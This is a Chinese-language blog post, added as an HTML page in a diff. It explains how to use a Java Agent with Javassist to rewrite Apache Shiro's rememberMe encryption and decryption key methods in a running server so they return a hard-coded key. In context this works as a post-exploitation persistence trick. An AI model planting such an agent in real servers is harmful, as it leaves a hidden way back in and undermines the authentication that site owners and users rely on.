@@ -1,0 +1,180 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Java Agent修改Shiro key | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Java Agent修改Shiro key"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Java Agent修改Shiro key</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/20/Java-Agent修改Shiro-key/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-20T05:40:29.000Z">
+          2021-10-20
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    之前佬哥给我提了个需求，如何修改<code>Shiro Key</code>，我们知道<code>Shiro</code>在高版本<code>key</code>默认是随机生成的，没有在配置文件中，即使在配置文件中配置了<code>key</code>,也要重启服务器完成修改也不太好，虽然之前知道可以通过<code>Java Agent</code>的方式完成修改，但当时没有了解过这个技术，最近刚好学习了<code>Java Agent</code>，所以抽空完成提过的需求。</p>
+<span id="more"></span>
+
+<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>​    我们只要找到<code>Shiro</code>加载<code>key</code>部分的代码，将<code>key</code>的值改掉即可。shiro的解密逻辑在<code>AbstractRememberMeManager#decrypt</code>中。可以看到解密的<code>key</code>是从<code>getDecryptionCipherKey()</code>得到的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">    CipherService cipherService = getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>getDecryptionCipherKey</code>是直接返回了<code>decryptionCipherKey</code>的结果，所以我们可以：</p>
+<ul>
+<li>修改<code>getDecryptionCipherKey</code>函数的返回结果</li>
+<li>修改<code>decryptionCipherKey</code>属性值</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] getDecryptionCipherKey() &#123;</span><br><span class="line">    <span class="keyword">return</span> decryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="修改getDecryptionCipherKey函数的返回结果"><a href="#修改getDecryptionCipherKey函数的返回结果" class="headerlink" title="修改getDecryptionCipherKey函数的返回结果"></a>修改<code>getDecryptionCipherKey</code>函数的返回结果</h3><p>​    修改<code>getDecryptionCipherKey</code>的<code>agent</code>实现如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                        ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">    <span class="keyword">if</span>(className.equals(<span class="string">&quot;org/apache/shiro/mgt/AbstractRememberMeManager&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123; ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">            classPool.appendClassPath(<span class="keyword">new</span> LoaderClassPath(loader));</span><br><span class="line">            CtClass clazz = classPool.makeClass(<span class="keyword">new</span> ByteArrayInputStream(classfileBuffer), <span class="keyword">false</span>);</span><br><span class="line">            CtMethod method = clazz.getDeclaredMethod(<span class="string">&quot;getDecryptionCipherKey&quot;</span>);</span><br><span class="line">            method.setBody(<span class="string">&quot;return (org.apache.shiro.codec.Base64.decode(\&quot;4AvVhmFLUs0KTA3Kprsdag==\&quot;));&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="依赖包坑点"><a href="#依赖包坑点" class="headerlink" title="依赖包坑点"></a>依赖包坑点</h4><p>​    虽然实现本身非常简单，但是在测试的过程中遇到了一个小坑，就是<code>ClassPool</code>后的代码一直没有执行，调试了很久才发现是因为没有打包<code>javasist</code>的依赖。</p>
+<p>​    还有一个坑点是因为我刚开始是使用了maven构建项目的，没打包jar是可以正常执行的，打包后会爆找不到<code>AttachNotSupportedException</code>类的异常，经过排查是因为依赖了<code>Tools.jar</code>，但这个依赖在<code>pom.xml</code>中的配置如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;java.home&#125;/../lib/tools.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    可以看到依赖的是本地系统的jar，而非远程下载的jar包，所以在打包的时候没有将这个jar打包进去，最后我是使用了手动将<code>tools.jar</code>添加<code>Libs</code>目录中解决了问题。</p>
+<h4 id="获取目录问题"><a href="#获取目录问题" class="headerlink" title="获取目录问题"></a>获取目录问题</h4><p>​    由于我是将<code>Attach</code>和<code>Agent</code>打包在一个jar包中的，所以要在运行是获取到<code>jar</code>包的路径并通过<code>loadAgent</code>函数加载，查阅资料后发现可以通过下面的语句获取。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String agentpath= AttachAgent.class.getProtectionDomain().getCodeSource().getLocation().getPath();</span><br></pre></td></tr></table></figure>
+
+<p>​    但是这样获取的路径是不能直接使用的，在windows下是多了一个<code>/</code>的，所以我们要把它处理掉。</p>
+<p><img src="/2021/10/20/Java-Agent%E4%BF%AE%E6%94%B9Shiro-key/image-20211021110218088.png" alt="image-20211021110218088"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span>(agentpath.contains(<span class="string">&quot;C:&quot;</span>)||agentpath.contains(<span class="string">&quot;D:&quot;</span>)||agentpath.contains(<span class="string">&quot;E:&quot;</span>))&#123;</span><br><span class="line">           agentpath=agentpath.substring(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="更改加密key"><a href="#更改加密key" class="headerlink" title="更改加密key"></a>更改加密key</h4><p>​    虽然上面已经更改了解密的key，但是如果解密的key和加密的key不一致，那么如果用户正常使用Remeberme记住密码就会导致登录不成功，所以我们我们还要修改加密的key，保证不影响网站的正常使用。</p>
+<p>​    加密的逻辑是在<code>getEncryptionCipherKey</code>中实现的， 所以我们只要更改这个函数的返回值就可以了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">    CipherService cipherService = getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    所以只要在<code>transform</code>中再修改下<code>getEncryptionCipherKey</code>方法的返回值即可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CtMethod method2 = clazz.getDeclaredMethod(<span class="string">&quot;getEncryptionCipherKey&quot;</span>);</span><br><span class="line">method2.setBody(<span class="string">&quot;return (org.apache.shiro.codec.Base64.decode(\&quot;4AvVhmFLUs0KTA3Kprsdag==\&quot;));&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    虽然还可以通过修改字段的方式实现，不过既然已经满足了需求，就先不分析另一种方法了。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9450">Java Agent 从入门到内存马</a></li>
+</ul>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/漏洞利用/">漏洞利用</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
